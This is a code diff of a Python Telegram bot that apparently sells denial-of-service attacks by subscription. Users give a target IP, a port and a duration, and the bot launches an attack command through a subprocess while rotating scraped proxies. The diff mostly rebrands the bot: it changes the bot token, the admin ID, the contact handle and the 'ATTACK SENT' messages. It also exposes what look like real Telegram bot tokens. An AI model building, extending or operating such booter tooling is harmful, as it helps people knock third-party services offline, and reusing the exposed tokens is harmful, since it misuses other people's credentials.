@@ -32,7 +32,7 @@ cred = credentials.Certificate(firebase_credentials)
 firebase_admin.initialize_app(cred)
 db = firestore.client()
 
-bot_token = '7825801271:AAHqKoXsB56mKvthbPP7-3nGeo0Ot-pqoS4'  # Replace with your bot token
+bot_token = '7640462411:AAEAncX9lZD3ahENd_fsvGAnrU6uD4CLBLI'  # Replace with your bot token
 proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'
 
 # Global iterator for proxies
@@ -69,7 +69,7 @@ def rotate_proxy(sent_message):
                 'https': f'https://{new_proxy}'
             }
             if sent_message.time_remaining > 0:
-                new_text = f"🚀⚡ ATTACK STARTED⚡🚀\n\n🎯 Target: {sent_message.target}\n🔌 Port: {sent_message.port}\n⏰ Time: {sent_message.time_remaining} Seconds\n🛡️ Proxy: {current_proxy}\n"
+                new_text = f"🥵🥵 ATTACK SENT 🥵🥵\n\n🎯 Target: {sent_message.target}\n🔌 Port: {sent_message.port}\n⏰ Time: {sent_message.time_remaining} Seconds\n🛡️ Proxy: {current_proxy}\n"
                 try:
                     bot.edit_message_text(new_text, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
                 except telebot.apihelper.ApiException as e:
@@ -79,7 +79,7 @@ def rotate_proxy(sent_message):
 
 bot = telebot.TeleBot(bot_token)
 
-ADMIN_ID = 786723480  # Replace with the actual admin's user ID
+ADMIN_ID = 7246521618  # Replace with the actual admin's user ID
 
 def generate_one_time_key():
     return secrets.token_urlsafe(16)
@@ -167,7 +167,7 @@ def process_attack(message):
             bot.reply_to(message, "🚫 Your subscription has expired or is invalid.")
             return
 
-        response = f"@{username}\n⚡ ATTACK STARTED ⚡\n\n🎯 Target: {target}\n🔌 Port: {port}\n⏰ Time: {attack_time} Seconds\n🛡️ Proxy: {current_proxy}\n"
+        response = f"@{username}\n⚡ ATTACK SENT ⚡\n\n🎯 Target: {target}\n🔌 Port: {port}\n⏰ Time: {attack_time} Seconds\n🛡️ Proxy: {current_proxy}\n"
         sent_message = bot.reply_to(message, response)
         sent_message.target = target
         sent_message.port = port
@@ -194,7 +194,7 @@ def run_attack(target, port, attack_time, sent_message):
         subprocess.run(full_command, shell=True)
 
         sent_message.time_remaining = 0
-        final_response = f"🚀⚡ ATTACK FINISHED⚡🚀"
+        final_response = f"🥵🥵ATTACK FINISHED🥵🥵"
         try:
             bot.edit_message_text(final_response, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
         except telebot.apihelper.ApiException as e:
@@ -237,7 +237,7 @@ def handle_stop(message):
     bot.reply_to(message, "🛑 Attack stopped.")
 
 def handle_contact_admin(message):
-    bot.reply_to(message, f"📞 @SOULCRACKS: {ADMIN_ID}")
+    bot.reply_to(message, f"📞 @RONIT_IN: {ADMIN_ID}")
 
 def handle_generate_key(message):
     if message.from_user.id == ADMIN_ID:
@@ -305,7 +305,7 @@ def handle_my_account(message):
     user_ref = db.collection('users').document(user_id)
 
     if not check_key_expiration(user_ref):
-        bot.reply_to(message, "🚫 Your subscription has expired or is invalid.")
+        bot.reply_to(message, "🚫 Your subscription has expired or is invalid. Contact - @RONIT_IN")
         return
 
     user_doc = user_ref.get()
@@ -418,7 +418,7 @@ def handle_delete_all(message):
     if message.from_user.id == ADMIN_ID:
         handle_delete_all_prompt(message)
     else:
-        bot.reply_to(message, "🚫 You do not have permission to perform this action.")
+        bot.reply_to(message, "🚫 You do not have permission to perform this action. CONTACT - @RONIT_IN")
 
 # Start polling
 bot.polling()
